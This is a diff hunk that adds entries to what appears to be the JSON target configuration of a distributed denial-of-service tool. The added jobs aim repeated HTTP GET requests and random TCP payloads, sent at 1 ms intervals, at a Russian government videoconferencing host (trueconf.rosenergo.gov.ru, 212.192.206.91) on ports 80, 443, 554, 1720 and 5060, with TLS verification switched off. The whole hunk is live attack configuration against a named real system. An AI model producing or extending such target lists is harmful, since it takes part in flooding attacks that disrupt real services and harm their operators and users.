@@ -15724,6 +15724,103 @@
       }
     },
     {
+      "type": "packetgen",
+      "name": "trueconf.rosenergo.gov.ru",
+      "args": {
+        "dynamic": false,
+        "connection": {
+          "type": "net",
+          "args": {
+            "protocol": "tcp",
+            "address": "212.192.206.91:80"
+          }
+        },
+        "packet": {
+          "payload": {
+            "type": "http",
+            "data": {
+              "method": "GET",
+              "path": "http://trueconf.rosenergo.gov.ru/oauth2/",
+              "headers": {
+                "User-Agent": "{{ random_user_agent }}"
+              }
+            }
+          }
+        }
+      },
+      "count": 1
+    },
+    {
+      "type": "packetgen",
+      "name": "trueconf.rosenergo.gov.ru",
+      "args": {
+        "dynamic": false,
+        "connection": {
+          "type": "net",
+          "args": {
+            "protocol": "tcp",
+            "address": "212.192.206.91:443",
+            "tls_config": {
+              "insecure_skip_verify": true
+            }
+          }
+        },
+        "packet": {
+          "payload": {
+            "type": "http",
+            "data": {
+              "method": "GET",
+              "path": "https://trueconf.rosenergo.gov.ru/oauth2/",
+              "headers": {
+                "User-Agent": "{{ random_user_agent }}"
+              }
+            }
+          }
+        }
+      },
+      "count": 1
+    },
+    {
+      "type": "tcp",
+      "count": 1,
+      "name": "212.192.206.91",
+      "args": {
+        "address": "212.192.206.91:554",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
+      }
+    },
+    {
+      "type": "tcp",
+      "count": 1,
+      "name": "212.192.206.91",
+      "args": {
+        "address": "212.192.206.91:1720",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
+      }
+    },
+    {
+      "type": "tcp",
+      "count": 1,
+      "name": "212.192.206.91",
+      "args": {
+        "address": "212.192.206.91:5060",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
+      }
+    },
+    {
+      "type": "tcp",
+      "count": 1,
+      "name": "212.192.206.91",
+      "args": {
+        "address": "212.192.206.91:5060",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
+      }
+    },
+    {
       "type": "encrypted",
       "args": {
         "format": "json",
